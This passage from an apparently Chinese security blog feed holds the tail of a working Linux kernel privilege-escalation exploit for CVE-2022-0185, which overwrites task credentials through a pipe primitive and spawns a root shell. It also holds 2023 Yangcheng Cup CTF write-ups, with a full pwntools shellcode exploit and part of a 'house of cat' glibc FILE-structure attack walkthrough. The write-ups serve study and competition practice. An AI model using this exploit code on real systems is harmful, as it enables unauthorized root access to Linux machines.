class="hljs-number">0xfff</span>));<br>    task_buf[<span class="hljs-number">2632</span>/<span class="hljs-number">8</span>] = init_cred;<br>    task_buf[<span class="hljs-number">2624</span>/<span class="hljs-number">8</span>] = init_cred;<br>    task_buf[<span class="hljs-number">341</span>] = init_nsproxy;<br>    arbitrary_write_by_pipe((<span class="hljs-keyword">struct</span> page*)current_page, page_buf, <span class="hljs-number">0xff0</span>);<br>    arbitrary_write_by_pipe((<span class="hljs-keyword">struct</span> page*)(current_page + <span class="hljs-number">0x40</span>), &amp;page_buf[<span class="hljs-number">0x1000</span>/<span class="hljs-number">8</span>], <span class="hljs-number">0xff0</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+]Done!&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_root_shell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(getuid()) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);<br>        sleep(<span class="hljs-number">5</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. \033[0m&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Execve root shell now...\033[0m&quot;</span>);<br>    <br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <br>    <span class="hljs-comment">/* to exit the process normally, instead of segmentation fault */</span><br>    <span class="hljs-built_in">exit</span>(EXIT_SUCCESS);<br>&#125;<br><br><br><span class="hljs-type">int</span> msg_pipe[<span class="hljs-number">2</span>];<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;   <br>    pipe(msg_pipe);<br>    bind_cpu(<span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">if</span>(!fork())&#123;<br>        unshare(CLONE_NEWNS | CLONE_NEWUSER);<br>        occupy_4k_obj_by_msg();sleep(<span class="hljs-number">1</span>);<br>        construct_first_uaf();sleep(<span class="hljs-number">1</span>);<br>        construct_second_uaf();sleep(<span class="hljs-number">1</span>);<br>        build_self_writing_pipe();sleep(<span class="hljs-number">1</span>);<br>        info_leaking_by_arbitrary_pipe();sleep(<span class="hljs-number">1</span>);<br>        priviledge_escalation();<br>        write(msg_pipe[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;peiwithhao&quot;</span>, <span class="hljs-number">10</span>);<br>        sleep(<span class="hljs-number">114514</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">if</span>(prctl(PR_SET_NAME, <span class="hljs-string">&quot;PEIWITHHAO&quot;</span>) &lt; <span class="hljs-number">0</span>)&#123;<br>            error_log(<span class="hljs-string">&quot;failed to prctl!&quot;</span>);<br>        &#125;<br>        <span class="hljs-type">char</span> ch;<br>        read(msg_pipe[<span class="hljs-number">0</span>], &amp;ch, <span class="hljs-number">1</span>);<br>    &#125;<br>    get_root_shell();<br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><ol><li><a href="https://zhuanlan.zhihu.com/p/67686817">醉卧沙场文件系列博客</a></li><li><a href="https://arttnba3.cn/2023/01/11/CVE-0X09-CVE-2022-0185/#0x00-%E4%B8%80%E5%88%87%E5%BC%80%E5%A7%8B%E4%B9%8B%E5%89%8D">arttnba3师傅复现博客</a></li><li><a href="https://patchwork.kernel.org/project/linux-security-module/cover/153754740781.17872.7869536526927736855.stgit@warthog.procyon.org.uk/">new mount API introduce</a></li><li><a href="https://rust-for-linux.github.io/docs/kernel/fs/flags/constant.ALLOW_IDMAP.html">rust for linux fs_flags</a></li><li><a href="https://www.willsroot.io/2022/01/cve-2022-0185.html">willsroot‘s analys blog</a></li><li><a href="https://www.willsroot.io/2021/08/corctf-2021-fire-of-salvation-writeup.html">拯救之火</a></li><li><a href="https://bsauce.github.io/2022/04/08/CVE-2022-0185/">bsauce师傅复现博客</a></li><li><a href="https://arttnba3.cn/2023/05/02/CTF-0X08_D3CTF2023_D3KCACHE/">a3师傅d3kcache出题笔记</a></li><li><a href="https://docs.kernel.org/admin-guide/kdump/vmcoreinfo.html">kernel doc</a></li><li><a href="https://cv196082.gitee.io/2023/05/24/pipe-buffer/">pipe_buffer相关博客</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PWN</tag>
      
      <tag>Linux</tag>
      
      <tag>Kernel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>羊城杯部分赛题复现</title>
    <link href="/2023/09/14/%E7%BE%8A%E5%9F%8E%E6%9D%AF%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/"/>
    <url>/2023/09/14/%E7%BE%8A%E5%9F%8E%E6%9D%AF%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="2023羊城杯部分赛题复现"><a href="#2023羊城杯部分赛题复现" class="headerlink" title="2023羊城杯部分赛题复现"></a>2023羊城杯部分赛题复现</h1><h1 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h1><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs lisp">unsigned __int64 __fastcall vuln(<span class="hljs-name">const</span> char *a1)<br>&#123;<br>  int v2; // [rsp+14h] [rbp-3Ch]<br>  void **buf; // [rsp+18h] [rbp-38h]<br>  void **v4; // [rsp+20h] [rbp-30h]<br>  void *s[<span class="hljs-number">3</span>]<span class="hljs-comment">; // [rsp+30h] [rbp-20h] BYREF</span><br>  unsigned __int64 v6<span class="hljs-comment">; // [rsp+48h] [rbp-8h]</span><br><br>  v6 = __readfsqword(<span class="hljs-number">0</span>x28u)<span class="hljs-comment">;</span><br>  printf(<span class="hljs-string">&quot;[3] Your Answer: %s\n&quot;</span>, a1)<span class="hljs-comment">;</span><br>  puts(<span class="hljs-string">&quot;[4] Welcome To P0P&#x27;s World!!!&quot;</span>)<span class="hljs-comment">;</span><br>  memset(<span class="hljs-name">s</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>x10uLL)<span class="hljs-comment">;</span><br>  puts(<span class="hljs-string">&quot;[5] ======== Input Your P0P Code ========&quot;</span>)<span class="hljs-comment">;</span><br>  for ( <span class="hljs-name">buf</span> = s<span class="hljs-comment">; buf; buf = (void **)((char *)buf + 1) )</span><br>  &#123;<br>    read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">1</span>uLL)<span class="hljs-comment">;</span><br>    if ( ((<span class="hljs-name">char</span> *)buf - (char *)s) &gt;&gt; <span class="hljs-number">4</span> &gt; <span class="hljs-number">0</span> )<br>      break<span class="hljs-comment">;</span><br>  &#125;<br>  v4 = s<span class="hljs-comment">;</span><br>  v2 = <span class="hljs-number">0</span><span class="hljs-comment">;</span><br>  puts(<span class="hljs-string">&quot;[6] Next&quot;</span>)<span class="hljs-comment">;</span><br>  if ( <span class="hljs-name">s</span> )<br>  &#123;<br>    while ( <span class="hljs-name">*</span>(<span class="hljs-name">char</span> *)v4 &gt;= 0x4F &amp;&amp; *(<span class="hljs-name">char</span> *)v4 &lt;= 0x5F )<br>    &#123;<br>      ++v2;<br>      v4 = (void **)((char *)v4 + <span class="hljs-number">1</span>)<span class="hljs-comment">;</span><br>    &#125;<br>    if ( !(((<span class="hljs-name">char</span> *)v4 - (char *)s) &gt;&gt; <span class="hljs-number">4</span>) )<br>    &#123;<br>      puts(<span class="hljs-string">&quot;[*] It&#x27;s Not GW&#x27;s Expect !&quot;</span>)<span class="hljs-comment">;</span><br>      exit(<span class="hljs-name">-1</span>)<span class="hljs-comment">;</span><br>    &#125;<br>  &#125;<br>  puts(<span class="hljs-string">&quot;[7] Just Do It!&quot;</span>)<span class="hljs-comment">;</span><br>  sub_1289()<span class="hljs-comment">;</span><br>  ((<span class="hljs-name">void</span> (<span class="hljs-name">*</span>)(<span class="hljs-name">void</span>))s[<span class="hljs-number">0</span>])()<span class="hljs-comment">;</span><br>  return v6 - __readfsqword(<span class="hljs-number">0</span>x28u)<span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>题目开始自带rwx段，我们可以将shellcode写到栈上进行利用，这里我们可以写入shellcode，但是由于只能写入0x10字节且存在沙箱，所以利用main函数中提前写入栈上的的syscall系统调用来进行简单read系统调用再次写入shellcode进行orw.</p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br><br>key = <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;</span><br>key_len = <span class="hljs-built_in">len</span>(key)<br><br>s   = <span class="hljs-keyword">lambda</span> content : io.send(content)<br>sl  = <span class="hljs-keyword">lambda</span> content : io.sendline(content)<br>sa  = <span class="hljs-keyword">lambda</span> content,send : io.sendafter(content, send)<br>sla = <span class="hljs-keyword">lambda</span> content,send : io.sendlineafter(content, send)<br>rc  = <span class="hljs-keyword">lambda</span> number : io.recv(number)<br>ru  = <span class="hljs-keyword">lambda</span> content : io.recvuntil(content)<br>rcl = <span class="hljs-keyword">lambda</span> : io.recvline()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">slog</span>(<span class="hljs-params">name, address</span>): <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[40;34m[+]\033[40;35m&quot;</span> + name + <span class="hljs-string">&quot;==&gt;&quot;</span> +<span class="hljs-built_in">hex</span>(address) + <span class="hljs-string">&quot;\033[0m&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd = <span class="hljs-number">0</span></span>):<br>    <span class="hljs-keyword">if</span> cmd == <span class="hljs-number">0</span>:<br>        gdb.attach(io)<br>    <span class="hljs-keyword">else</span>:<br>        gdb.attach(io, cmd)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_address</span>(<span class="hljs-params">mode = <span class="hljs-number">0</span></span>): <br>    <span class="hljs-keyword">if</span> mode == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> u64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    <span class="hljs-keyword">elif</span> mode == <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">return</span> u64(rc(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    <span class="hljs-keyword">elif</span> mode == <span class="hljs-number">2</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(rc(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br>    <span class="hljs-keyword">elif</span> mode == <span class="hljs-number">3</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(rc(<span class="hljs-number">16</span>), <span class="hljs-number">16</span>)<br>    <span class="hljs-keyword">else</span> :<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br><br>io = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>debug(<span class="hljs-string">&quot;b *$rebase(0x14f2)&quot;</span>)<br>sa(<span class="hljs-string">&quot;no)\n&quot;</span>, asm(<span class="hljs-string">&#x27;syscall&#x27;</span>))<br>payload = asm(<br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">              push rax; </span><br><span class="hljs-string">              pop rsi;             </span><br><span class="hljs-string">              push rbx; </span><br><span class="hljs-string">              pop rax; </span><br><span class="hljs-string">              push rbx; </span><br><span class="hljs-string">              pop rdi; </span><br><span class="hljs-string">              pop rbx; </span><br><span class="hljs-string">              pop rbx; </span><br><span class="hljs-string">              pop rsp;</span><br><span class="hljs-string">              pop rbp;</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>)<br>payload = payload.ljust(<span class="hljs-number">0xf</span>, asm(<span class="hljs-string">&#x27;push rbp;&#x27;</span>)) + asm(<span class="hljs-string">&quot;pop rdx;&quot;</span>) + p8(<span class="hljs-number">0xf</span>)<br><br>sa(<span class="hljs-string">&quot;==\n&quot;</span>, payload)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>shellcode = <span class="hljs-string">b&quot;\x90&quot;</span>*<span class="hljs-number">0x12</span><br>shellcode += asm(shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./flag&quot;</span>))<br>shellcode += asm(<br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    mov rdi, rax;</span><br><span class="hljs-string">    mov rax, 33;</span><br><span class="hljs-string">    mov rsi, 0;</span><br><span class="hljs-string">    syscall;</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>)<br>shellcode += asm(<br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    mov rax, 0;</span><br><span class="hljs-string">    mov rdi, 0;</span><br><span class="hljs-string">    mov rsi, r12;</span><br><span class="hljs-string">    mov rdx, 0x30;</span><br><span class="hljs-string">    syscall;</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>)<br><br>shellcode += asm(<br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    mov rdi, 1;</span><br><span class="hljs-string">    mov rax, 33;</span><br><span class="hljs-string">    mov rsi, 4;</span><br><span class="hljs-string">    syscall;</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>)<br>s<br>shellcode += asm(<br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    mov rax, 1;</span><br><span class="hljs-string">    mov rdi, 4;</span><br><span class="hljs-string">    mov rsi, r12;</span><br><span class="hljs-string">    mov rdx, 0x30;</span><br><span class="hljs-string">    syscall;</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>)<br>sleep(<span class="hljs-number">1</span>)<br>sl(shellcode)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h1 id="house-of-cat"><a href="#house-of-cat" class="headerlink" title="house of cat"></a>house of cat</h1><p>既然只是为了学习这个利用手法，所以找的强网杯当年出的同名题house of cat</p><p>该手法主要是利用偏移vtable,和house of kiwi类似的触发手法，导致最后有一条调用链，在下面解题当中细说</p><p>首先题目、</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">&#x27;[*] &#x27;/home/peiwithhao/Downloads/pwn&#x27;</span><br><span class="hljs-attribute">    Arch</span><span class="hljs-punctuation">:</span> <span class="hljs-string">    amd64-64-little</span><br>    <span class="hljs-attribute">RELRO</span><span class="hljs-punctuation">:</span> <span class="hljs-string">   Full RELRO</span><br>    <span class="hljs-attribute">Stack</span><span class="hljs-punctuation">:</span> <span class="hljs-string">   Canary found</span><br>    <span class="hljs-attribute">NX</span><span class="hljs-punctuation">:</span> <span class="hljs-string">      NX enabled</span><br>    <span class="hljs-attribute">PIE</span><span class="hljs-punctuation">:</span> <span class="hljs-string">     PIE enabled</span><br>    <span class="hljs-attribute">RUNPATH</span><span class="hljs-punctuation">:</span> <span class="hljs-string"> b&#x27;./&#x27;</span><br><br></code></pre></td></tr></table></figure><p>题目版本为glibc-2.35,题目逆向方面，漏洞即为uaf,且修改部分限制了只有两次，且限制了题目申请的堆块大小，只能申请到部分largebin,所以题目中我们采用两次largebin attack进行地址任意写</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-keyword">void</span> delete()<br>&#123;<br>  unsigned __int64 <span class="hljs-built_in">num</span>; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  my_write(<span class="hljs-string">&quot;plz input your cat idx:\n&quot;</span>);<br>  <span class="hljs-built_in">num</span> = (unsigned <span class="hljs-built_in">int</span>)get_num();<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">num</span> &lt;= <span class="hljs-number">0xF</span> &amp;&amp; *((_QWORD *)&amp;chunk_ptr + <span class="hljs-built_in">num</span>) )<br>    free(*((<span class="hljs-keyword">void</span> **)&amp;chunk_ptr + <span class="hljs-built_in">num</span>));<br>  <span class="hljs-keyword">else</span><br>    my_write(<span class="hljs-string">&quot;invalid!\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>首先我们第一次写stderr指针内容为我们堆块上的一个地址，这样我们就可以创建一个虚假的<code>_IO_2_1_stderr</code>,因此我们也可以修改其vtable的指针，但是由于高版本IO的限制，其中对于vtable的地址需要处于一定段之中，但是对于其中的具体地址却检查的并不细致，所以我们可以对于其中vtable的指针进行一个偏移，这里我们如果将stderr指向的结构体中vtable变为<code>_IO_wfile_jumps+0x10</code>,那么本该调用<code>__xsputn</code>就会调用到<code>__seekoff</code></p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-comment">/* offset      |    size */</span>  <span class="hljs-built_in">type</span> = struct <span class="hljs-variable">_IO_jump_t</span> &#123;<br><span class="hljs-comment">/*      0      |       8 */</span>    size_t <span class="hljs-variable">__dummy</span>;<br><span class="hljs-comment">/*      8      |       8 */</span>    size_t <span class="hljs-variable">__dummy2</span>;<br><span class="hljs-comment">/*     16      |       8 */</span>    <span class="hljs-variable">_IO_finish_t</span> <span class="hljs-variable">__finish</span>;<br><span class="hljs-comment">/*     24      |       8 */</span>    <span class="hljs-variable">_IO_overflow_t</span> <span class="hljs-variable">__overflow</span>;<br><span class="hljs-comment">/*     32      |       8 */</span>    <span class="hljs-variable">_IO_underflow_t</span> <span class="hljs-variable">__underflow</span>;<br><span class="hljs-comment">/*     40      |       8 */</span>    <span class="hljs-variable">_IO_underflow_t</span> <span class="hljs-variable">__uflow</span>;<br><span class="hljs-comment">/*     48      |       8 */</span>    <span class="hljs-variable">_IO_pbackfail_t</span> <span class="hljs-variable">__pbackfail</span>;<br><span class="hljs-comment">/*     56      |       8 */</span>    <span class="hljs-variable">_IO_xsputn_t</span> <span class="hljs-variable">__xsputn</span>;<br><span class="hljs-comment">/*     64      |       8 */</span>    <span class="hljs-variable">_IO_xsgetn_t</span> <span class="hljs-variable">__xsgetn</span>;<br><span class="hljs-comment">/*     72      |       8 */</span>    <span class="hljs-variable">_IO_seekoff_t</span> <span class="hljs-variable">__seekoff</span>;<br><span class="hljs-comment">/*     80      |       8 */</span>    <span class="hljs-variable">_IO_seekpos_t</span> <span class="hljs-variable">__seekpos</span>;<br><span class="hljs-comment">/*     88      |       8 */</span>    <span class="hljs-variable">_IO_setbuf_t</span> <span class="hljs-variable">__setbuf</span>;<br><span class="hljs-comment">/*     96      |       8 */</span>    <span class="hljs-variable">_IO_sync_t</span> <span class="hljs-variable">__sync</span>;<br><span class="hljs-comment">/*    104      |       8 */</span>    <span class="hljs-variable">_IO_doallocate_t</span> <span class="hljs-variable">__doallocate</span>;<br><span class="hljs-comment">/*    112      |       8 */</span>    <span class="hljs-variable">_IO_read_t</span> <span class="hljs-variable">__read</span>;<br><span class="hljs-comment">/*    120      |       8 */</span>    <span class="hljs-variable">_IO_write_t</span> <span class="hljs-variable">__write</span>;<br><span class="hljs-comment">/*    128      |       8 */</span>    <span class="hljs-variable">_IO_seek_t</span> <span class="hljs-variable">__seek</span>;<br><span class="hljs-comment">/*    136      |       8 */</span>    <span class="hljs-variable">_IO_close_t</span> <span class="hljs-variable">__close</span>;<br><span class="hljs-comment">/*    144      |       8 */</span>    <span class="hljs-variable">_IO_stat_t</span> <span class="hljs-variable">__stat</span>;<br><span class="hljs-comment">/*    152      |       8 */</span>    <span class="hljs-variable">_IO_showmanyc_t</span> <span class="hljs-variable">__showmanyc</span>;<br><span class="hljs-comment">/*    160      |       8 */</span>    <span class="hljs-variable">_IO_imbue_t</span> <span class="hljs-variable">__imbue</span>;<br><br></code></pre></td></tr></table></figure><p>而house of cat就是利用到了调用到了__seekoff，从源码我们可以查看</p><p>首先就是借鉴house of kiwi的思想，触发<code>__malloc_assert</code>来进行利用，然后会调用</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">static <span class="hljs-type">void</span><br>__malloc_assert (const <span class="hljs-type">char</span> *<span class="hljs-keyword">assertion</span>, const <span class="hljs-type">char</span> *file, unsigned <span class="hljs-type">int</span> <span class="hljs-type">line</span>,<br> const <span class="hljs-type">char</span> *<span class="hljs-keyword">function</span>)<br>&#123;<br>  (<span class="hljs-type">void</span>) __fxprintf (<span class="hljs-keyword">NULL</span>, &quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;,<br>     __progname, __progname[<span class="hljs-number">0</span>] ? &quot;: &quot; : &quot;&quot;,<br>     file, <span class="hljs-type">line</span>,<br>     <span class="hljs-keyword">function</span> ? <span class="hljs-keyword">function</span> : &quot;&quot;, <span class="hljs-keyword">function</span> ? &quot;: &quot; : &quot;&quot;,<br>     <span class="hljs-keyword">assertion</span>);<br>  fflush (stderr);<br>  <span class="hljs-keyword">abort</span> ();<br>&#125;<br></code></pre></td></tr></table></figure><p><code>fflush(stderr)</code>，这里如果我们修改了stderr,就会触发我们想要的过程，如下</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">int</span> _IO_fflush (FILE *fp)<br>&#123;<br>  <span class="hljs-attribute">if</span> (fp == NULL)<br>    return _IO_flush_all ();<br>  <span class="hljs-section">else</span><br>    &#123;<br>      <span class="hljs-attribute">int</span> result;<br>      <span class="hljs-attribute">CHECK_FILE</span> (fp, EOF);<br>      <span class="hljs-attribute">_IO_acquire_lock</span> (fp);<br>      <span class="hljs-attribute">result</span> = _IO_SYNC (fp) ? EOF : <span class="hljs-number">0</span>;<br>      <span class="hljs-attribute">_IO_release_lock</span> (fp);<br>      <span class="hljs-attribute">return</span> result;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里调用链如下：</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-variable">__malloc_assert</span><br> <span class="hljs-variable">__fxprintf</span><br> <span class="hljs-variable">__vfxprintf</span><br> <span class="hljs-variable">__locked_vfxprintf</span><br> <span class="hljs-variable">__vfwprintf_internal</span><br></code></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">locked_vfxprintf</span> (FILE *fp, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *fmt, va_list ap,<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> mode_flags)<br>&#123;<br>  <span class="hljs-keyword">if</span> (_IO_fwide (fp, <span class="hljs-number">0</span>) &lt;= <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> __vfprintf_internal (fp, fmt, ap, mode_flags);<br><br>  <span class="hljs-comment">/* We must convert the narrow format string to a wide one.</span><br><span class="hljs-comment">     Each byte can produce at most one wide character.  */</span><br>  <span class="hljs-type">wchar_t</span> *wfmt;<br>  <span 